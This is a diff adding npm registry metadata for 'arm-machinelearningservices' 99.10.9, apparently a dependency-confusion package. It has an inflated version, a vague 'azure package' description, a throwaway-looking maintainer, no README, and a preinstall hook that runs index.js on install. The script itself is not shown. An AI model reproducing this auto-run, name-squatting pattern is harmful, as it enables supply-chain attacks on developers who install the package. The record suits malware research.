@@ -1,0 +1,62 @@
+{
+    "_id": "arm-machinelearningservices",
+    "name": "arm-machinelearningservices",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "arm-machinelearningservices",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "arm-machinelearningservices@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-1CN8hzLVGhKSX3bm4W+Pu+WYYJIG+lpVIuJ+Hje1x9FF0nW3fsgcOBqiO9EtBg8k49BmxRj4Zr9Ei9M0ik+XCA==",
+                "shasum": "25df55c824629c80cc1722adf2f5a66b4c56b8ea",
+                "tarball": "https://registry.npmjs.org/arm-machinelearningservices/-/arm-machinelearningservices-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5079,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNzdTACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmpDsQ//U/RdLbqKmUaZA5mOcLz6njbcrjPiLEqoLhraUN390aKapBpe\r\nTK127WlV8LKCmSf6Cw8p9lfdXNN7PLvlI9OtgO9CDzICi3L/dvzWmBco7Hsx\r\n7NWfuiOn7NxuJb1/LYphdOiO1YbjXADcgsFbkW1QnYsy8dRhQnwHztXisFt7\r\nw/4Vr8s+ZZPg6K1t8DpR7CHyxpxJNuzwKailfuJnxlQnKb/A65vnKVDQqpZs\r\n0EvlwUmolY+nGXPql3Vd9nU517VjBDiSa+00VbUIl+uzGnLPM18fBdF727pV\r\nHSq13SnzssE3jMHi3uKvSi+W9sWAARq/D2mHpgxL7vYs3f+Nt06aOEzXtmSc\r\n8Dq3kYGN37gB21D4wLepRpGIFE3WrU928hswqKz6PEjZRVXElUFOjSAI0Sci\r\n7oaHbHoEOXbBcNQ2CA9RofE1sI9Cj2RXHoTmex/IYoM+P9ZyOR1Bq95BM336\r\nxwZ3Uaf8s/UeHullnyjekkGMwrPlqW4j17qrqJHoBPka7J5v17FLMXm8j4sj\r\nAYIi9jLYU5byFu17AQ70H1k5IJqhQgbLbdRP4dtdOWPOe1tlVW9AU7CiehdM\r\n9f45qAIRzveAWbwFC63nOCuBiSRk3owpIwRwE3kkJ2deMw44NhpTOOpdIsm9\r\nkXjrpuNkKNEhkMQ6LA4VrTPYUjFS1vKonGs=\r\n=9ljK\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "dzp3ud7e",
+                "email": "dzp3ud7e@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "dzp3ud7e",
+                    "email": "dzp3ud7e@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/arm-machinelearningservices_99.10.9_1647785811270_0.9074748427689847"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-20T14:16:51.270Z",
+        "99.10.9": "2022-03-20T14:16:51.432Z",
+        "modified": "2022-03-20T14:16:51.531Z"
+    },
+    "maintainers": [
+        {
+            "name": "dzp3ud7e",
+            "email": "dzp3ud7e@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
